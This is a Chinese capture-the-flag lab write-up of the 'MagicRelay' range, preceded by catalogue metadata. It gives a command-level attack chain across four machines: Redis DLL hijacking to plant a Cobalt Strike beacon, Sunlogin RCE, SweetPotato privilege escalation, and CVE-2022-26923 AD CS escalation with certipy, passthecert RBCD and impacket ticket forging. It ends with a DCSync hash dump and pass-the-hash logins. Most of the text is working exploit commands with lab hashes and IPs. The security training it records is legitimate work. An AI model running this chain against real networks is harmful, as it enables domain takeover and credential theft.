---
title: 春秋云境MagicRelay WP
contest: 春秋云境靶场
year: 2022
difficulty: hard
vuln_type: auth_bypass
tags: [Redis DLL劫持, 向日葵RCE, SweetPotato提权, CVE-2022-26923, ADCS, passthecert, RBCD攻击, 哈希传递]
attack_chain: Redis未授权dll劫持上线CS马(flag1)→内网扫描→向日葵RCE加管理员账号(flag2)→SweetPotato提权→certify收集AD CS信息→CVE-2022-26923域提权→passthecert打RBCD→申请CIFS票据impersonate Administrator(flag4)→DCSync导出域管哈希→PTH到WIN-AUTHORITY读flag3
key_payload: "python3 RedisWriteFile.py --rhost ...;sunRce.exe -h ... -t rce -c 'type C:\\flag02.txt';certipy account create -u WIN-YUYAOX9Q$ -hashes ...;passthecert.py -action write_rbcd ...;impacket-getST xiaorang.lab/'simho$' -spn cifs/WIN-SERVER"
one_liner: 春秋云境MagicRelay：Redis DLL劫持+向日葵RCE+AD CS域提权(CVE-2022-26923)+RBCD全链路
lesson: 域内AD CS证书服务+机器账户+passthecert可实现无域管密码登录域控
quality: high
---

# 春秋云境MagicRelay WP

**靶场**：春秋云境MagicRelay / Legacy Network（中难，4个flag分布于不同机器）

**攻击链全景**：

**Flag1（边界机39.98.117.52）**：
- fscan扫到 Redis 3 未授权（6379）
- Redis主从复制需4.0+ → 改用 DLL劫持
- `python3 DllHijacker.py dbghelp.dll` 生成恶意DLL
- `python3 RedisWriteFile.py --rhost ... --rfile dbghelp.dll` 写入Redis目录
- bgsave触发劫持 → CS马上线（administrator权限）
- flag1: `flag{58455a83-7516-4a8f-92bf-ca94e7aa33a0}`

**Flag2（向日葵靶机172.22.12.31）**：
- fscan扫到向日葵 SunloginClient_11.0.0.33826_x64.exe
- `sunRce.exe -h 172.22.12.31 -t rce -p 49688 -c "..."` RCE
- 加管理员账号 + type读flag
- flag2: `flag{29a46b72-8a82-182a-45f3-532475ec6fd4}`

**Flag4（域控WIN-SERVER 172.22.12.6）**：
- redis机器（172.22.12.25）有 SeImpersonatePrivilege → SweetPotato提权到system
- CS抓 WIN-YUYAOX9Q$ 机器账户 NTLM: `e611213c6a712f9b18a8d056005a4f0f`
- certify收集 AD CS 信息（xiaorang-WIN-AUTHORITY-CA）
- **CVE-2022-26923 AD CS域提权**：
  - `certipy account create -u WIN-YUYAOX9Q$ -hashes ... -user simho -dns WIN-SERVER.xiaorang.lab` 创建新机器账户 simho$/YNj8hDLLR82VNLZq
  - `certipy req` 获取 DC 机器证书
  - `passthecert.py -action write_rbcd -delegate-to 'win-server$' -delegate-from 'simho$'` 写RBCD
  - `impacket-getST ... -spn cifs/WIN-SERVER -impersonate Administrator` 申请CIFS票据
  - `impacket-psexec Administrator@WIN-SERVER -k -no-pass` 无密码登录域控
- flag4: `flag{4c7d6e81-3161-4853-b93f-349ab74a60e5}`

**Flag3（WIN-AUTHORITY 172.22.12.12）**：
- mimikatz dcsync导出域管hash: `aa95e708a5182931157a526acf769b13`
- `impacket-smbexec -hashes :aa95e708a5182931157a526acf769b13 xiaorang/administrator@172.22.12.12`
- flag3: `flag{317621a6-bb66-4154-b157-365c871d52d2}`

**核心知识点**：
- Redis 3.x Windows DLL劫持（主从复制需4.0+的替代方案）
- 向日葵客户端 RCE（端口40000-50000）
- SeImpersonatePrivilege + SweetPotato 提权
- AD CS (CVE-2022-26923) + passthecert + RBCD攻击
- 哈希传递 (PTH)

**质量评估**：高（命令级payload完整，覆盖4 flag + 4种权限提升路径）
